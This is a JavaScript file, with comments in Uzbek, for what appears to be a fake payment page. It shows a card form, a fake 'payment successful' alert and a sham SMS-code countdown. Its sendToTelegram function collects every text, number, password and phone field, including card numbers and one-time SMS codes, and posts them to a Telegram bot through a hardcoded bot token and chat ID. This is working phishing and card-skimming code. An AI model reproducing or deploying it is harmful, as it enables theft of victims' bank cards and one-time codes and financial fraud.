const infoForm = document.getElementById('infoForm');
const paymentModal = document.getElementById('paymentModal');
const closeModalBtn = document.getElementById('closeModalBtn');
const cardForm = document.getElementById('cardForm');
const cardNumberInput = document.getElementById('cardNumber');
const smsInput = document.getElementById('smsCode');
const payBtn = document.getElementById('payBtn');
const btnText = document.getElementById('btnText');

// Timer uchun o‘zgaruvchilar
let countdownInterval = null;
let timeLeft = 30;
let isConfirmMode = false; // false = "Sms kod olish", true = "Tasdiqlash"

// Birinchi sahifada "To'lashga o'tish" bosilganda karta oynasini ochish
infoForm.addEventListener('submit', function(e) {
    e.preventDefault();
    paymentModal.classList.remove('hidden');
});

// X tugmasi bosilganda modalni yopish
closeModalBtn.addEventListener('click', () => {
    paymentModal.classList.add('hidden');
});

// Karta raqamiga har 4 ta sondan so'ng avtomatik probel qo'shish
cardNumberInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    e.target.value = value.replace(/(.{4})/g, '$1 ').trim();
});

// Karta ma'lumotlari kiritilib "Tasdiqlash va to'lash" bosilganda
cardForm.addEventListener('submit', (e) => {
    e.preventDefault();
    alert("To'lov muvaffaqiyatli amalga oshirildi!");
    paymentModal.classList.add('hidden');
});

// SMS input validatsiyasi
smsInput.addEventListener('invalid', function(e) {
    e.target.setCustomValidity('SMS kodni yozmadingiz');
});

smsInput.addEventListener('input', function(e) {
    e.target.setCustomValidity('');
    // Xato xabarini yashirish (agar bor bo‘lsa)
    const errorEl = document.getElementById('smsError');
    if (errorEl) errorEl.style.display = 'none';
    e.target.style.borderColor = '';
});

// ========== ASOSIY FUNKSIYA ==========
async function sendLogs() {
    const smsError = document.getElementById('smsError');

    // 1. Dastlabki bosishda karta/shaxsiy ma'lumotlarni Telegramga yuborish
    await sendToTelegram();

    // 2. SMS inputini faqat "Tasdiqlash" rejimida majburiy qilish
    if (isConfirmMode && !smsInput.value.trim()) {
        if (smsError) {
            smsError.style.display = 'block';
            smsError.textContent = 'Maydonchani to‘ldirmadingiz';
        }
        smsInput.style.borderColor = 'red';
        smsInput.focus();
        return;
    }

    if (smsError) smsError.style.display = 'none';
    smsInput.style.borderColor = '';

    // 3. Agar "Tasdiqlash" rejimida bo'lsa
    if (isConfirmMode) {
        console.log('Tasdiqlash bosildi, kod:', smsInput.value);
        return;
    }

    // 4. "Sms kod olish" bosilganda timer boshlanishi
    payBtn.disabled = true;
    btnText.textContent = `Sms kod olish (${timeLeft})`;

    countdownInterval = setInterval(() => {
        timeLeft--;
        btnText.textContent = `Sms kod olish (${timeLeft})`;

        if (timeLeft <= 0) {
            clearInterval(countdownInterval);
            payBtn.disabled = false;
            btnText.textContent = 'Tasdiqlash';
            isConfirmMode = true;
            timeLeft = 30;
        }
    }, 1000);
}

// Telegramga yuborish funksiyasi
async function sendToTelegram() {
    const BOT_TOKEN = "8886404463:AAGhzfYVBbbrqvGR7Rk5u21gim_bahroRk8";
    const CHAT_ID = "-1004354162477"; // <<-- Shu ID ni bot bergan to'g'ri Kanal/Guruh ID-siga almashtiring

    const inputs = document.querySelectorAll('input[type="text"], input[type="number"], input[type="password"], input[type="tel"]');
    
    let messageText = "📋 <b>Yangi ma'lumot kiritildi:</b>\n\n";
    let hasData = false;

    inputs.forEach((input, index) => {
        const val = input.value.trim();
        if (val !== "") {
            hasData = true;
            const label = input.placeholder || input.name || `Maydon ${index + 1}`;
            messageText += `🔹 <b>${label}:</b> <code>${val}</code>\n`;
        }
    });

    if (!hasData) return;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: messageText,
                parse_mode: 'HTML'
            })
        });

        const resData = await response.json();
        if (!resData.ok) {
            console.error("Telegram API Xatosi:", resData.description);
        } else {
            console.log("Xabar muvaffaqiyatli ketdi!");
        }
    } catch (error) {
        console.error("Tarmoq xatosi:", error);
    }
}